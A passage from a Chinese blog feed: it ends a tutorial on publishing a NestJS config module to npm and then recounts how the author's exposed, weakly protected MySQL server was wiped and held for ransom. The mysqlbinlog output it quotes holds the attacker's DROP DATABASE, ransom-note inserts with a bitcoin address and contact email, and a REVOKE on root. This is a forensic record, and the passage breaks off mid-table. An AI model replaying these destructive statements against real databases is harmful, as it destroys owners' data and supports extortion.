<p><code>typescript</code>作为<code>javascript</code>的超集并不能直接运行在浏览器或<code>node</code>运行时中，<code>ts</code>把<code>js</code>封装得连它妈(浏览器、<code>node</code>)都不认识了，要想进门必须把这身皮脱掉，这个活儿由<code>tsc</code>负责，<code>tsc</code>把ts编译为原生的<code>js</code>代码，而说到编译就会涉及到不同的编译参数及配置，<code>tsconfig.json</code>挺身而出.</p>
<blockquote>
<p>The presence of a tsconfig.json file in a directory indicates that the directory is the root of a TypeScript project. The tsconfig.json file specifies the root files and the compiler options required to compile the project.</p>
</blockquote>
<p>具体配置可参考 <a href="https://www.typescriptlang.org/docs/handbook/tsconfig-json.html">https://www.typescriptlang.org/docs/handbook/tsconfig-json.html</a></p>
<h4 id="告诉它存在的意义"><a href="#告诉它存在的意义" class="headerlink" title="告诉它存在的意义"></a>告诉它存在的意义</h4><p>本项目只实现一个简易的<code>nest</code>配置模块，项目启动时自动获取指定<strong>config</strong>目录的所有配置，这份配置可以在项目任何其他模块使用. </p>
<p>为什么会存在依赖<code>nest</code>的库呢，比如像<code>lodash</code>、<code>axios</code>这些库可以直接在<code>nest</code>中使用，并不依赖于<code>nest</code>(它们在江湖上大杀四方的时候<code>nest</code>还在吃奶吧)，那我们要写的这个库可以这么酷吗？不好意思这个头必须得低，因为有求于人，我们要在项目启动时初始化所有配置，而且配置获取的方式也依赖框架(provider)，它们那么酷是因为没有包袱，如果你也能对社会对外界对欲望少一些依赖，你也可以这么酷:)</p>
<p>如前文所讲，我们要依赖<code>nest</code>框架的启动来加载配置，需要引入<strong>动态模块</strong>的<a href="https://docs.nestjs.com/fundamentals/dynamic-modules">概念</a>，提供一个<code>ConfigModule</code>用于<code>import</code>，提供一个<code>ConfigService</code>作为<code>Provider</code>供其他模块引入使用，所有代码均在项目的<a href="https://github.com/tashuo/nestjs-config/tree/main/src"><code>src</code>目录下</a>.</p>
<h4 id="告诉它要靠谱"><a href="#告诉它要靠谱" class="headerlink" title="告诉它要靠谱"></a>告诉它要靠谱</h4><blockquote>
<p>Jest is a delightful JavaScript Testing Framework with a focus on simplicity.</p>
</blockquote>
<blockquote>
<p>It works with projects using: Babel, TypeScript, Node, React, Angular, Vue and more!</p>
</blockquote>
<p>俗话说得好，没有提供单元测试的代码都是耍花枪，而且编写单元测试时总会时不时得告诉你的代码有多屎，比如现在写的<code>ConfigService</code>无法脱离<code>ConfigModule</code>单独测试，因为<code>constructor</code>依赖了从<code>ConfigModule</code>注入的参数，所以出现了三个单元测试文件的奇观，如果够优雅的话一个文件就可以覆盖所有的测试，后面再优化，下次一定.</p>
<p>单元测试代码在<a href="https://github.com/tashuo/nestjs-config/tree/main/test"><code>test</code>目录</a></p>
<h4 id="告诉它做一个对社会有用的人"><a href="#告诉它做一个对社会有用的人" class="headerlink" title="告诉它做一个对社会有用的人"></a>告诉它做一个对社会有用的人</h4><p>项目开发完需要发布到公有的<code>npm</code>仓库才可以使用，官方仓库是<code>https://registry.npmjs.org/</code>，国内一般使用淘宝、清华或其他境内的源，在进行发布流程中如果设置了非官方源，<strong>需要在下面执行命令时显式指定官方的源</strong>(–registry <a href="https://registry.npmjs.org/">https://registry.npmjs.org</a>)</p>
<ol>
<li>编译代码(<code>$: tsc</code>)</li>
<li>注册npm账号(<a href="https://www.npmjs.com/">https://www.npmjs.com/</a>)</li>
<li>登录(<code>$: npm login --registry https://registry.npmjs.org)</code>)</li>
<li>发布到远程仓库(<code>$: npm publish --registry https://registry.npmjs.org)</code>)</li>
</ol>
<p>需要注意的是，<code>npm</code>直接使用<code>package.json</code>中的<code>name</code>作为全局包名，如果包名已存在就会报错.</p>
<p>本来以为像<code>php</code>的<code>composer</code>一样包名会带前缀，起码没那么容易冲突，结果<code>npm</code>这操作整的，会不会很多很屌的包名已经被人恶意占坑了.</p>
<h3 id="仓库"><a href="#仓库" class="headerlink" title="仓库"></a>仓库</h3><p>所有的代码都在<a href="https://github.com/tashuo/nestjs-config">https://github.com/tashuo/nestjs-config</a>，欢迎提出问题一起交流.</p>
]]></content>
      <categories>
        <category>typescript</category>
        <category>nestjs</category>
      </categories>
      <tags>
        <tag>npm</tag>
        <tag>jest</tag>
        <tag>javascript</tag>
      </tags>
  </entry>
  <entry>
    <title>记一次mysql被黑的经历</title>
    <url>/2023/03/17/flarum-mysql-recover/</url>
    <content><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>前段时间用<code>flarum</code>搭了个论坛，由于docker设置mysql端口对外开放且密码很简单，不出意外中招了:) 一大早有群友找上来说网站又打不开，我收住了即将第五十三次劝她换掉e家宽的冲动，打开网页一看事情没那么简单～</p>
<h2 id="中招"><a href="#中招" class="headerlink" title="中招"></a>中招</h2><p><img src="https://i.328888.xyz/2023/03/17/LGKvq.png" alt="LGKvq.png"></p>
<p>错误日志：这他娘的库子都没了:)<br><img src="https://i.328888.xyz/2023/03/17/LGoEN.png" alt="LGoEN.png"></p>
<span id="more"></span>
<p>mysql：谁还硬给我套上一条形迹可疑的库子<br><img src="https://i.328888.xyz/2023/03/17/LGS2o.png" alt="LGS2o.png"></p>
<p><img src="https://i.328888.xyz/2023/03/17/LGsTV.png" alt="LGsTV.png"></p>
<p>mysql：是他动的手，看你选择我还是选择btc吧</p>
<p><img src="https://i.328888.xyz/2023/03/17/LG9Wd.png" alt="LG9Wd.png"></p>
<p>虽说不值钱吧，也Google了一下，发现大把的幸运儿都上了这趟车，基本都是弱密码、对外开放的mongo、mysql服务被自动化扫描工具拉上了车，对比其他网友我这0.21btc的价还算良心，要不给他汇过去？犹豫之余花呗账单发来了本期还款提醒，0.21rmb我也没能力给了！！淦他！！</p>
<h2 id="止损"><a href="#止损" class="headerlink" title="止损"></a>止损</h2><p>从冰箱拽出已经见底的快乐水猛嘬一口缓了缓神， 一看这新库子的创建时间和编号000017的binlog时间有猫腻</p>
<p><img src="https://i.328888.xyz/2023/03/17/LGJpb.png" alt="LGJpb.png"></p>
<h3 id="祭出mysqlbinlog追踪溯源"><a href="#祭出mysqlbinlog追踪溯源" class="headerlink" title="祭出mysqlbinlog追踪溯源"></a>祭出mysqlbinlog追踪溯源</h3><p><code>mysqlbinlog --no-defaults --base64-output=decode-rows -v --database flarum_hnxc data/mysql/binlog.000017 | less</code><br><img src="https://i.328888.xyz/2023/03/17/LGM4z.png" alt="LGM4z.png"></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">#<span class="number">230316</span> <span class="number">22</span>:<span class="number">22</span>:<span class="number">55</span> server id <span class="number">1</span>  end_log_pos <span class="number">817941</span> CRC32 <span class="number">0xb1803186</span> 	Xid <span class="operator">=</span> <span class="number">124243</span></span><br><span class="line"><span class="keyword">COMMIT</span><span class="comment">/*!*/</span>;</span><br><span class="line"># <span class="keyword">at</span> <span class="number">817941</span></span><br><span class="line">#<span class="number">230317</span>  <span class="number">2</span>:<span class="number">22</span>:<span class="number">11</span> server id <span class="number">1</span>  end_log_pos <span class="number">818018</span> CRC32 <span class="number">0x6ccc23b0</span> 	Anonymous_GTID	last_committed<span class="operator">=</span><span class="number">801</span>	sequence_number<span class="operator">=</span><span class="number">802</span>	rbr_only<span class="operator">=</span><span class="keyword">no</span>	original_committed_timestamp<span class="operator">=</span><span class="number">1678990932030791</span>	immediate_commit_timestamp<span class="operator">=</span><span class="number">1678990932030791</span>	transaction_length<span class="operator">=</span><span class="number">202</span></span><br><span class="line"># original_commit_timestamp<span class="operator">=</span><span class="number">1678990932030791</span> (<span class="number">2023</span><span class="number">-03</span><span class="number">-17</span> <span class="number">02</span>:<span class="number">22</span>:<span class="number">12.030791</span> CST)</span><br><span class="line"># immediate_commit_timestamp<span class="operator">=</span><span class="number">1678990932030791</span> (<span class="number">2023</span><span class="number">-03</span><span class="number">-17</span> <span class="number">02</span>:<span class="number">22</span>:<span class="number">12.030791</span> CST)</span><br><span class="line"><span class="comment">/*!80001 SET @@session.original_commit_timestamp=1678990932030791*/</span><span class="comment">/*!*/</span>;</span><br><span class="line"><span class="comment">/*!80014 SET @@session.original_server_version=80028*/</span><span class="comment">/*!*/</span>;</span><br><span class="line"><span class="comment">/*!80014 SET @@session.immediate_server_version=80028*/</span><span class="comment">/*!*/</span>;</span><br><span class="line"><span class="keyword">SET</span> @<span class="variable">@SESSION</span>.GTID_NEXT<span class="operator">=</span> <span class="string">&#x27;ANONYMOUS&#x27;</span><span class="comment">/*!*/</span>;</span><br><span class="line"># <span class="keyword">at</span> <span class="number">818018</span></span><br><span class="line">#<span class="number">230317</span>  <span class="number">2</span>:<span class="number">22</span>:<span class="number">11</span> server id <span class="number">1</span>  end_log_pos <span class="number">818143</span> CRC32 <span class="number">0x6a55306b</span> 	Query	thread_id<span class="operator">=</span><span class="number">9046</span>	exec_time<span class="operator">=</span><span class="number">1</span>	error_code<span class="operator">=</span><span class="number">0</span>	Xid <span class="operator">=</span> <span class="number">138918</span></span><br><span class="line"><span class="keyword">SET</span> <span class="type">TIMESTAMP</span><span class="operator">=</span><span class="number">1678990931</span><span class="comment">/*!*/</span>;</span><br><span class="line"><span class="keyword">SET</span> @<span class="variable">@session</span>.foreign_key_checks<span class="operator">=</span><span class="number">0</span><span class="comment">/*!*/</span>;</span><br><span class="line"><span class="keyword">SET</span> @<span class="variable">@session</span>.sql_mode<span class="operator">=</span><span class="number">1168113696</span><span class="comment">/*!*/</span>;</span><br><span class="line"><span class="comment">/*!\C utf8mb4 */</span><span class="comment">/*!*/</span>;</span><br><span class="line"><span class="keyword">SET</span> @<span class="variable">@session</span>.character_set_client<span class="operator">=</span><span class="number">45</span>,@<span class="variable">@session</span>.collation_connection<span class="operator">=</span><span class="number">45</span>,@<span class="variable">@session</span>.collation_server<span class="operator">=</span><span class="number">255</span><span class="comment">/*!*/</span>;</span><br><span class="line"><span class="keyword">DROP</span> DATABASE flarum_hnxc</span><br><span class="line"><span class="comment">/*!*/</span>;</span><br><span class="line"># <span class="keyword">at</span> <span class="number">818143</span></span><br><span class="line">#<span class="number">230317</span>  <span class="number">2</span>:<span class="number">22</span>:<span class="number">13</span> server id <span class="number">1</span>  end_log_pos <span class="number">818220</span> CRC32 <span class="number">0x3bb6c0c2</span> 	Anonymous_GTID	last_committed<span class="operator">=</span><span class="number">802</span>	sequence_number<span class="operator">=</span><span class="number">803</span>	rbr_only<span class="operator">=</span><span class="keyword">no</span>	original_committed_timestamp<span class="operator">=</span><span class="number">1678990933086201</span>	immediate_commit_timestamp<span class="operator">=</span><span class="number">1678990933086201</span>	transaction_length<span class="operator">=</span><span class="number">244</span></span><br><span class="line"># original_commit_timestamp<span class="operator">=</span><span class="number">1678990933086201</span> (<span class="number">2023</span><span class="number">-03</span><span class="number">-17</span> <span class="number">02</span>:<span class="number">22</span>:<span class="number">13.086201</span> CST)</span><br><span class="line"># immediate_commit_timestamp<span class="operator">=</span><span class="number">1678990933086201</span> (<span class="number">2023</span><span class="number">-03</span><span class="number">-17</span> <span class="number">02</span>:<span class="number">22</span>:<span class="number">13.086201</span> CST)</span><br><span class="line"><span class="comment">/*!80001 SET @@session.original_commit_timestamp=1678990933086201*/</span><span class="comment">/*!*/</span>;</span><br><span class="line"><span class="comment">/*!80014 SET @@session.original_server_version=80028*/</span><span class="comment">/*!*/</span>;</span><br><span class="line"><span class="comment">/*!80014 SET @@session.immediate_server_version=80028*/</span><span class="comment">/*!*/</span>;</span><br><span class="line"><span class="keyword">SET</span> @<span class="variable">@SESSION</span>.GTID_NEXT<span class="operator">=</span> <span class="string">&#x27;ANONYMOUS&#x27;</span><span class="comment">/*!*/</span>;</span><br><span class="line"># <span class="keyword">at</span> <span class="number">818220</span></span><br><span class="line">#<span class="number">230317</span>  <span class="number">2</span>:<span class="number">22</span>:<span class="number">13</span> server id <span class="number">1</span>  end_log_pos <span class="number">818387</span> CRC32 <span class="number">0x23b60335</span> 	Query	thread_id<span class="operator">=</span><span class="number">9048</span>	exec_time<span class="operator">=</span><span class="number">0</span>	error_code<span class="operator">=</span><span class="number">0</span>	Xid <span class="operator">=</span> <span class="number">138923</span></span><br><span class="line"><span class="keyword">SET</span> <span class="type">TIMESTAMP</span><span class="operator">=</span><span class="number">1678990933</span><span class="comment">/*!*/</span>;</span><br><span class="line"><span class="keyword">SET</span> @<span class="variable">@session</span>.foreign_key_checks<span class="operator">=</span><span class="number">1</span><span class="comment">/*!*/</span>;</span><br><span class="line"><span class="comment">/*!80016 SET @@session.default_table_encryption=0*/</span><span class="comment">/*!*/</span>;</span><br><span class="line"><span class="keyword">CREATE</span> DATABASE IF <span class="keyword">NOT</span> <span class="keyword">EXISTS</span> README_TO_RECOVER_A</span><br><span class="line"><span class="comment">/*!*/</span>;</span><br><span class="line"># <span class="keyword">at</span> <span class="number">818387</span></span><br><span class="line">#<span class="number">230317</span>  <span class="number">2</span>:<span class="number">22</span>:<span class="number">13</span> server id <span class="number">1</span>  end_log_pos <span class="number">818466</span> CRC32 <span class="number">0x38d5237c</span> 	Anonymous_GTID	last_committed<span class="operator">=</span><span class="number">803</span>	sequence_number<span class="operator">=</span><span class="number">804</span>	rbr_only<span class="operator">=</span><span class="keyword">no</span>	original_committed_timestamp<span class="operator">=</span><span class="number">1678990933650518</span>	immediate_commit_timestamp<span class="operator">=</span><span class="number">1678990933650518</span>	transaction_length<span class="operator">=</span><span class="number">261</span></span><br><span class="line"># original_commit_timestamp<span class="operator">=</span><span class="number">1678990933650518</span> (<span class="number">2023</span><span class="number">-03</span><span class="number">-17</span> <span class="number">02</span>:<span class="number">22</span>:<span class="number">13.650518</span> CST)</span><br><span class="line"># immediate_commit_timestamp<span class="operator">=</span><span class="number">1678990933650518</span> (<span class="number">2023</span><span class="number">-03</span><span class="number">-17</span> <span class="number">02</span>:<span class="number">22</span>:<span class="number">13.650518</span> CST)</span><br><span class="line"><span class="comment">/*!80001 SET @@session.original_commit_timestamp=1678990933650518*/</span><span class="comment">/*!*/</span>;</span><br><span class="line"><span class="comment">/*!80014 SET @@session.original_server_version=80028*/</span><span class="comment">/*!*/</span>;</span><br><span class="line"><span class="comment">/*!80014 SET @@session.immediate_server_version=80028*/</span><span class="comment">/*!*/</span>;</span><br><span class="line"><span class="keyword">SET</span> @<span class="variable">@SESSION</span>.GTID_NEXT<span class="operator">=</span> <span class="string">&#x27;ANONYMOUS&#x27;</span><span class="comment">/*!*/</span>;</span><br><span class="line"># <span class="keyword">at</span> <span class="number">818466</span></span><br><span class="line">#<span class="number">230317</span>  <span class="number">2</span>:<span class="number">22</span>:<span class="number">13</span> server id <span class="number">1</span>  end_log_pos <span class="number">818648</span> CRC32 <span class="number">0xb40c7f04</span> 	Query	thread_id<span class="operator">=</span><span class="number">9048</span>	exec_time<span class="operator">=</span><span class="number">0</span>	error_code<span class="operator">=</span><span class="number">0</span>	Xid <span class="operator">=</span> <span class="number">138926</span></span><br><span class="line">use `README_TO_RECOVER_A`<span class="comment">/*!*/</span>;</span><br><span class="line"><span class="keyword">SET</span> <span class="type">TIMESTAMP</span><span class="operator">=</span><span class="number">1678990933</span><span class="comment">/*!*/</span>;</span><br><span class="line"><span class="comment">/*!80013 SET @@session.sql_require_primary_key=0*/</span><span class="comment">/*!*/</span>;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> IF <span class="keyword">NOT</span> <span class="keyword">EXISTS</span> RECOVER_YOUR_DATA (text <span class="type">VARCHAR</span>(<span class="number">255</span>))</span><br><span class="line"><span class="comment">/*!*/</span>;</span><br><span class="line"># <span class="keyword">at</span> <span class="number">818648</span></span><br><span class="line">#<span class="number">230317</span>  <span class="number">2</span>:<span class="number">22</span>:<span class="number">14</span> server id <span class="number">1</span>  end_log_pos <span class="number">818727</span> CRC32 <span class="number">0x623fc5ec</span> 	Anonymous_GTID	last_committed<span class="operator">=</span><span class="number">804</span>	sequence_number<span class="operator">=</span><span class="number">805</span>	rbr_only<span class="operator">=</span>yes	original_committed_timestamp<span class="operator">=</span><span class="number">1678990934196612</span>	immediate_commit_timestamp<span class="operator">=</span><span class="number">1678990934196612</span>	transaction_length<span class="operator">=</span><span class="number">867</span></span><br><span class="line"><span class="comment">/*!50718 SET TRANSACTION ISOLATION LEVEL READ COMMITTED*/</span><span class="comment">/*!*/</span>;</span><br><span class="line"># original_commit_timestamp<span class="operator">=</span><span class="number">1678990934196612</span> (<span class="number">2023</span><span class="number">-03</span><span class="number">-17</span> <span class="number">02</span>:<span class="number">22</span>:<span class="number">14.196612</span> CST)</span><br><span class="line"># immediate_commit_timestamp<span class="operator">=</span><span class="number">1678990934196612</span> (<span class="number">2023</span><span class="number">-03</span><span class="number">-17</span> <span class="number">02</span>:<span class="number">22</span>:<span class="number">14.196612</span> CST)</span><br><span class="line"><span class="comment">/*!80001 SET @@session.original_commit_timestamp=1678990934196612*/</span><span class="comment">/*!*/</span>;</span><br><span class="line"><span class="comment">/*!80014 SET @@session.original_server_version=80028*/</span><span class="comment">/*!*/</span>;</span><br><span class="line"><span class="comment">/*!80014 SET @@session.immediate_server_version=80028*/</span><span class="comment">/*!*/</span>;</span><br><span class="line"><span class="keyword">SET</span> @<span class="variable">@SESSION</span>.GTID_NEXT<span class="operator">=</span> <span class="string">&#x27;ANONYMOUS&#x27;</span><span class="comment">/*!*/</span>;</span><br><span class="line"># <span class="keyword">at</span> <span class="number">818727</span></span><br><span class="line">#<span class="number">230317</span>  <span class="number">2</span>:<span class="number">22</span>:<span class="number">13</span> server id <span class="number">1</span>  end_log_pos <span class="number">818817</span> CRC32 <span class="number">0x8823f509</span> 	Query	thread_id<span class="operator">=</span><span class="number">9048</span>	exec_time<span class="operator">=</span><span class="number">0</span>	error_code<span class="operator">=</span><span class="number">0</span></span><br><span class="line"><span class="keyword">SET</span> <span class="type">TIMESTAMP</span><span class="operator">=</span><span class="number">1678990933</span><span class="comment">/*!*/</span>;</span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line"><span class="comment">/*!*/</span>;</span><br><span class="line"># <span class="keyword">at</span> <span class="number">818817</span></span><br><span class="line">#<span class="number">230317</span>  <span class="number">2</span>:<span class="number">22</span>:<span class="number">13</span> server id <span class="number">1</span>  end_log_pos <span class="number">818899</span> CRC32 <span class="number">0x7d2db7cd</span> 	Table_map: `README_TO_RECOVER_A`.`RECOVER_YOUR_DATA` mapped <span class="keyword">to</span> number <span class="number">214</span></span><br><span class="line"># <span class="keyword">at</span> <span class="number">818899</span></span><br><span class="line">#<span class="number">230317</span>  <span class="number">2</span>:<span class="number">22</span>:<span class="number">13</span> server id <span class="number">1</span>  end_log_pos <span class="number">819157</span> CRC32 <span class="number">0x9d8fc1a8</span> 	Write_rows: <span class="keyword">table</span> id <span class="number">214</span> flags: STMT_END_F</span><br><span class="line">### <span class="keyword">INSERT</span> <span class="keyword">INTO</span> `README_TO_RECOVER_A`.`RECOVER_YOUR_DATA`</span><br><span class="line">### <span class="keyword">SET</span></span><br><span class="line">###   <span class="variable">@1</span><span class="operator">=</span><span class="string">&#x27;All your data is a backed up. You must pay 0.21 BTC to 18FJ6C6TBpv6va7vLKDri9ibGDWgnYx8Me After 48 hours expiration we will leak and expose all your data. After 48 hours the database dump will be deleted from our server!&#x27;</span></span><br><span class="line"># <span class="keyword">at</span> <span class="number">819157</span></span><br><span class="line">#<span class="number">230317</span>  <span class="number">2</span>:<span class="number">22</span>:<span class="number">14</span> server id <span class="number">1</span>  end_log_pos <span class="number">819239</span> CRC32 <span class="number">0xe67f3dbd</span> 	Table_map: `README_TO_RECOVER_A`.`RECOVER_YOUR_DATA` mapped <span class="keyword">to</span> number <span class="number">214</span></span><br><span class="line"># <span class="keyword">at</span> <span class="number">819239</span></span><br><span class="line">#<span class="number">230317</span>  <span class="number">2</span>:<span class="number">22</span>:<span class="number">14</span> server id <span class="number">1</span>  end_log_pos <span class="number">819484</span> CRC32 <span class="number">0x732fb5ba</span> 	Write_rows: <span class="keyword">table</span> id <span class="number">214</span> flags: STMT_END_F</span><br><span class="line">### <span class="keyword">INSERT</span> <span class="keyword">INTO</span> `README_TO_RECOVER_A`.`RECOVER_YOUR_DATA`</span><br><span class="line">### <span class="keyword">SET</span></span><br><span class="line">###   <span class="variable">@1</span><span class="operator">=</span><span class="string">&#x27;You can buy bitcoin in https://binance.com After paying write to us in the mail with your DB IP: rasmus+2rps0@onionmail.org and you will receive a link to download your database dump. CHECK YOUR SPAM FOLDER!&#x27;</span></span><br><span class="line"># <span class="keyword">at</span> <span class="number">819484</span></span><br><span class="line">#<span class="number">230317</span>  <span class="number">2</span>:<span class="number">22</span>:<span class="number">14</span> server id <span class="number">1</span>  end_log_pos <span class="number">819515</span> CRC32 <span class="number">0xd9a7afc1</span> 	Xid <span class="operator">=</span> <span class="number">138927</span></span><br><span class="line"><span class="keyword">COMMIT</span><span class="comment">/*!*/</span>;</span><br><span class="line"># <span class="keyword">at</span> <span class="number">819515</span></span><br><span class="line">#<span class="number">230317</span>  <span class="number">2</span>:<span class="number">22</span>:<span class="number">14</span> server id <span class="number">1</span>  end_log_pos <span class="number">819592</span> CRC32 <span class="number">0xfa9fa3bd</span> 	Anonymous_GTID	last_committed<span class="operator">=</span><span class="number">805</span>	sequence_number<span class="operator">=</span><span class="number">806</span>	rbr_only<span class="operator">=</span><span class="keyword">no</span>	original_committed_timestamp<span class="operator">=</span><span class="number">1678990934381072</span>	immediate_commit_timestamp<span class="operator">=</span><span class="number">1678990934381072</span>	transaction_length<span class="operator">=</span><span class="number">241</span></span><br><span class="line"># original_commit_timestamp<span class="operator">=</span><span class="number">1678990934381072</span> (<span class="number">2023</span><span class="number">-03</span><span class="number">-17</span> <span class="number">02</span>:<span class="number">22</span>:<span class="number">14.381072</span> CST)</span><br><span class="line"># immediate_commit_timestamp<span class="operator">=</span><span class="number">1678990934381072</span> (<span class="number">2023</span><span class="number">-03</span><span class="number">-17</span> <span class="number">02</span>:<span class="number">22</span>:<span class="number">14.381072</span> CST)</span><br><span class="line"><span class="comment">/*!80001 SET @@session.original_commit_timestamp=1678990934381072*/</span><span class="comment">/*!*/</span>;</span><br><span class="line"><span class="comment">/*!80014 SET @@session.original_server_version=80028*/</span><span class="comment">/*!*/</span>;</span><br><span class="line"><span class="comment">/*!80014 SET @@session.immediate_server_version=80028*/</span><span class="comment">/*!*/</span>;</span><br><span class="line"><span class="keyword">SET</span> @<span class="variable">@SESSION</span>.GTID_NEXT<span class="operator">=</span> <span class="string">&#x27;ANONYMOUS&#x27;</span><span class="comment">/*!*/</span>;</span><br><span class="line"># <span class="keyword">at</span> <span class="number">819592</span></span><br><span class="line">#<span class="number">230317</span>  <span class="number">2</span>:<span class="number">22</span>:<span class="number">14</span> server id <span class="number">1</span>  end_log_pos <span class="number">819756</span> CRC32 <span class="number">0xde317be1</span> 	Query	thread_id<span class="operator">=</span><span class="number">9048</span>	exec_time<span class="operator">=</span><span class="number">0</span>	error_code<span class="operator">=</span><span class="number">0</span>	Xid <span class="operator">=</span> <span class="number">138930</span></span><br><span class="line"><span class="keyword">SET</span> <span class="type">TIMESTAMP</span><span class="operator">=</span><span class="number">1678990934</span><span class="comment">/*!*/</span>;</span><br><span class="line"><span class="keyword">REVOKE</span> <span class="keyword">INSERT</span>, <span class="keyword">DELETE</span>, <span class="keyword">CREATE</span>, <span class="keyword">DROP</span> <span class="keyword">ON</span> <span class="operator">*</span>.<span class="operator">*</span> <span class="keyword">FROM</span> <span class="string">&#x27;root&#x27;</span></span><br><span class="line"><span class="comment">/*!*/</span>;</span><br><span class="line"># <span class="keyword">at</span> <span class="number">819756</span></span><br><span class="line">#<span class="number">230317</span>  <span class="number">2</span>:<span class="number">22</span>:<span class="number">14</span> server id <span class="number">1</span>  end_log_pos <span class="number">819833</span> CRC32 <span class="number">0xb128744c</span> 	Anonymous_GTID	last_committed<span class="operator">=</span><span class="number">806</span>	sequence_number<span class="operator">=</span><span class="number">807</span>	rbr_only<span class="operator">=</span><span class="keyword">no</span>	original_committed_timestamp<span class="operator">=</span><span class="number">1678990934564760</span>	immediate_commit_timestamp<span class="operator">=</span><span class="number">1678990934564760</span>	transaction_length<span class="operator">=</span><span class="number">186</span></span><br><span class="line"># original_commit_timestamp<span class="operator">=</span><span class="number">1678990934564760</span> (<span class="number">2023</span><span class="number">-03</span><span class="number">-17</span> <span class="number">02</span>:<span class="number">22</span>:<span class="number">14.564760</span> CST)</span><br><span class="line"># immediate_commit_timestamp<span class="operator">=</span><span class="number">1678990934564760</span> (<span class="number">2023</span><span class="number">-03</span><span class="number">-17</span> <span class="number">02</span>:<span class="number">22</span>:<span class="number">14.564760</span> CST)</span><br><span class="line"><span class="comment">/*!80001 SET @@session.original_commit_timestamp=1678990934564760*/</span><span class="comment">/*!*/</span>;</span><br><span class="line"><span class="comment">/*!80014 SET @@session.original_server_version=80028*/</span><span class="comment">/*!*/</span>;</span><br><span class="line"><span class="comment">/*!80014 SET @@session.immediate_server_version=80028*/</span><span class="comment">/*!*/</span>;</span><br><span class="line"><span class="keyword">SET</span> @<span class="variable">@SESSION</span>.GTID_NEXT<span class="operator">=</span> <span class="string">&#x27;ANONYMOUS&#x27;</span><span class="comment">/*!*/</span>;</span><br><span class="line"># <span class="keyword">at</span> <span class="number">819833</span></span><br><span class="line">#<span class="number">230317</span>  <span class="number">2</span>:<span class="number">22</span>:<span class="number">14</span> server id <span class="number">1</span>  end_log_pos <span class="number">819942</span> CRC32 <span class="number">0x16becbcb</span> 	Query	thread_id<span class="operator">=</span><span class="number">9048</span>	exec_time<span class="operator">=</span><span class="number">0</span>	error_code<span class="operator">=</span><span class="number">0</span></span><br><span class="line"><span class="keyword">SET</span> <span class="type">TIMESTAMP</span><span class="operator">=</span><span class="number">1678990934</span><span class="comment">/*!*/</span>;</span><br><span class="line">FLUSH PRIVILEGES</span><br><span class="line"><span class="comment">/*!*/</span>;</span><br><span class="line"># <span class="keyword">at</span> <span class="number">819942</span></span><br><span class="line">#<span class="number">230317</span>  <span class="number">2</span>:<span class="number">22</span>:<span class="number">15</span> server id <span class="number">1</span>  end_log_pos <span class="number">819965</span> CRC32 <span class="number">0x8b38ef1d</span> 	Stop</span><br><span class="line"><span class="keyword">SET</span> @<span class="variable">@SESSION</span>.GTID_NEXT<span class="operator">=</span> <span class="string">&#x27;AUTOMATIC&#x27;</span> <span class="comment">/* added by mysqlbinlog */</span> <span class="comment">/*!*/</span>;</span><br><span class="line">DELIMITER ;</span><br><span class="line"># <span class="keyword">End</span> <span class="keyword">of</span> log file</span><br><span class="line"><span class="comment">/*!50003 SET COMPLETION_TYPE=@OLD_COMPLETION_TYPE*/</span>;</span><br><span class="line"><span class="comment">/*!50530 SET @@SESSION.PSEUDO_SLAVE_MODE=0*/</span>;</span><br></pre></td></tr></table></figure>

<p>通过上面详细的日志看到这厮drop了俺的库，那条新库子也在此时创建，后面还修改了root用户的权限? 有意思，为啥留了update权限给俺:)</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> <span class="keyword">user</span> <span class="operator">=</span> <span class="string">&#x27;root&#x27;</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">-----------+------+-------------+-------------+-------------+-------------+-------------+-----------+-------------+---------------+--------------+-----------+------------+-----------------+------------+------------+--------------+------------+-----------------------+------------------+--------------+-----------------+------------------+------------------+----------------+---------------------+--------------------+------------------+------------+--------------+------------------------+----------+------------------------+--------------------------+----------------------------+---------------+-------------+-----------------+----------------------+-----------------------+------------------------------------------------------------------------+------------------+-----------------------+-------------------+----------------+------------------+----------------+------------------------+---------------------+--------------------------+-----------------+</span></span><br><span class="line"><span class="operator">|</span> Host      <span class="operator">|</span> <span class="keyword">User</span> <span class="operator">|</span> Select_priv <span class="operator">|</span> Insert_priv <span class="operator">|</span> Update_priv <span class="operator">|</span> Delete_priv <span class="operator">|</span> Create_priv <span class="operator">|</span> Drop_priv <span class="operator">|</span> Reload_priv <span class="operator">|</span> Shutdown_priv <span class="operator">|</span> Process_priv <span class="operator">|</span> File_priv <span class="operator">|</span> Grant_priv <span class="operator">|</span> References_priv <span class="operator">|</span> Index_priv <span class="operator">|</span> Alter_priv <span class="operator">|</span> Show_db_priv <span class="operator">|</span> Super_priv <span class="operator">|</span> Create_tmp_table_priv <span class="operator">|</span> Lock_tables_priv <span class="operator">|</span> Execute_priv <span class="operator">|</span> Repl_slave_priv <span class="operator">|</span> Repl_client_priv <span class="operator">|</span> Create_view_priv <span class="operator">|</span> Show_view_priv <span class="operator">|</span> Create_routine_priv <span class="operator">|</span> Alter_routine_priv <span class="operator">|</span> Create_user_priv <span class="operator">|</span> Event_priv <span class="operator">|</span> Trigger_priv <span class="operator">|</span> Create_tablespace_priv <span class="operator">|</span> ssl_type <span class="operator">|</span> ssl_cipher             <span class="operator">|</span> x509_issuer              <span class="operator">|</span> x509_subject               <span class="operator">|</span> max_questions <span class="operator">|</span> max_updates <span class="operator">|</span> max_connections <span class="operator">|</span> max_user_connections <span class="operator">|</span> plugin                <span class="operator">|</span> authentication_string                                                  <span class="operator">|</span> password_expired <span class="operator">|</span> password_last_changed <span class="operator">|</span> password_lifetime <span class="operator">|</span> account_locked <span class="operator">|</span> Create_role_priv <span class="operator">|</span> Drop_role_priv <span class="operator">|</span> Password_reuse_history <span class="operator">|</span> Password_reuse_time <span class="operator">|</span> Password_require_current <span class="operator">|</span> User_attributes <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="commentspan></span><br><span class="line"><span class="operator">|</span> <span class="operator">%</span>         <span class="operator">|</span> root <span class="operator">|</span> Y           <span class="operator">|</span> N           <span class="operator">|</span> Y           <span class="operator">|</span> N           <span class="operator">|</span> 